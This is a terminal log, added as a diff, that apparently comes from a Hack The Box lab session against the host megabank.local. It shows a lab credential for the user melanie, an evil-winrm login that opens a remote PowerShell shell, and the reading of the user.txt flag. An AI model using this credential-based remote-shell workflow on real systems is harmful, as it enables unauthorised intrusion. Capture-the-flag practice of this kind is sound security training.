@@ -1,0 +1,44 @@
+    -V, --version                    Show version                    
+    -n, --no-colors                  Disable colors                  
+    -h, --help                       Display this help message       
+
+user@kali:~/Downloads/tools$ evil-winrm ^C                            
+user@kali:~/Downloads/tools$ cat /etc/hosts                           
+127.0.0.1       localhost         
+192.168.10.6    kali              
+10.10.10.162    staging-order.mango.htb mango.htb                    
+10.10.10.168    obscure.htb       
+10.10.10.169    megabank.local    
+# The following lines are desirable for IPv6 capable hosts           
+::1     localhost ip6-localhost ip6-loopback                         
+ff02::1 ip6-allnodes              
+ff02::2 ip6-allrouters            
+user@kali:~/Downloads/tools$ #evil-winrm -i megabank.local -u                                                                               
+user@kali:~/Downloads/tools$ vim creds                                
+user@kali:~/Downloads/tools$ cat creds                                
+melanie@megabank.local:Welcome123!                                   
+user@kali:~/Downloads/tools$ evil-winrm -i megabank.local -u melanie -p 'Welcome123!'                                                       
+
+Evil-WinRM shell v2.3             
+
+Info: Establishing connection to remote endpoint                     
+
+*Evil-WinRM* PS C:\Users\melanie\Documents> whoami                   
+megabank\melanie                  
+*Evil-WinRM* PS C:\Users\melanie\Documents> dir                      
+*Evil-WinRM* PS C:\Users\melanie\Documents> cd ..                    
+*Evil-WinRM* PS C:\Users\melanie> cd Desktop                         
+*Evil-WinRM* PS C:\Users\melanie\Desktop> dir                        
+
+
+    Directory: C:\Users\melanie\Desktop                              
+
+
+Mode                LastWriteTime         Length Name                
+----                -------------         ------ ----                
+-ar---        12/3/2019   7:33 AM             32 user.txt            
+
+
+*Evil-WinRM* PS C:\Users\melanie\Desktop> type user.txt              
+0c3be45fcfe249796ccbee8d3a978540  
+*Evil-WinRM* PS C:\Users\melanie\Desktop>                            
